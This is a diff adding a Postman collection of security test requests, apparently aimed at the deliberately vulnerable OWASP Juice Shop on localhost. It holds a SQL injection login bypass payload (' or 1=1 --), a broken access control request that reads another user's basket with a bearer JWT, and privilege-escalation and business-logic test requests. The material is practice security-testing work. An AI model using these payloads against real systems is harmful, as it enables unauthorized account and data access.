@@ -1,0 +1,192 @@
+{
+	"info": {
+		"_postman_id": "54b8ef07-e05a-4f9d-a56e-c575842dba94",
+		"name": "Juice-shop",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Input_Validation",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"email\":\"test.test@test.com\",\n\t\"password\":\"12345\",\n\t\"passwordRepeat\":\"12345\",\n\t\"securityQuestion\":{\n\t\t\"id\":2,\n\t\t\"question\":\"Mother's maiden name?\",\n\t\t\"createdAt\":\"2019-10-06T13:51:21.532Z\",\n\t\t\"updatedAt\":\"2019-10-06T13:51:21.532Z\"\n\t},\n\t\"securityAnswer\":\"test\"\n}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/api/Users/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"api",
+						"Users",
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Order_Validation",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://localhost:3000/rest/track-order/c93-fb1170f56cac0dda",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"rest",
+						"track-order",
+						"c93-fb1170f56cac0dda"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "SQLi Log in",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"email\":\"test.test@test.com\",\n\t\"password\":\"' or 1=1 --\"\n}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/rest/user/login",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"rest",
+						"user",
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Feedback_business_logic",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"UserId\":15,\n\t\"captchaId\":0,\n\t\"captcha\":\"50\",\n\t\"comment\":\"test\",\n\t\"rating\":0\n}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/api/Feedbacks/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"api",
+						"Feedbacks",
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Broken_Access_Control",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0LnRlc3RAdGVzdC5jb20iLCJwYXNzd29yZCI6ImI3Y2M2YjllN2YzNjFkZWM3NWU5YmI0N2I2Y2Y5YmM5IiwiaXNBZG1pbiI6ZmFsc2UsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDE5LTEwLTA5IDE5OjI0OjI4LjQ1MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE5LTEwLTA5IDE5OjI0OjI4LjQ1MCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE1NzA2NDkyNDMsImV4cCI6MTU3MDY2NzI0M30.eNehGS3iuS8rUwMkoMoOo7yQ8UH0AJPbmImBacRdsUIUeyZ4OQZmAEdaX1VcoWHfhvdM1yLXl3WTno1g_vzwcNSyCcS7Ao3KOpRFrdb4Zoqfdgpw9mVtfyEMWNd1MXNMU8IiKfrDy1oOF11kywETbnJvqt23dJKYZCK0bWD-z3Y",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:3000/rest/basket/1",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"rest",
+						"basket",
+						"1"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Privilege_Escalation",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"email\":\"user.test@test.com\",\n\t\"password\":\"Testjuiceshop123*\",\n\t\"passwordRepeat\":\"Testjuiceshop123*\",\n\t\"securityQuestion\":\n\t{\n\t\t\"id\":2,\n\t\t\"question\":\"Mother's maiden name?\",\n\t\t\"createdAt\":\"2019-10-09T19:11:26.731Z\",\n\t\t\"updatedAt\":\"2019-10-09T19:11:26.731Z\"\n\t},\n\t\"securityAnswer\":\"test\"\n}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/api/Users/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"api",
+						"Users",
+						""
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
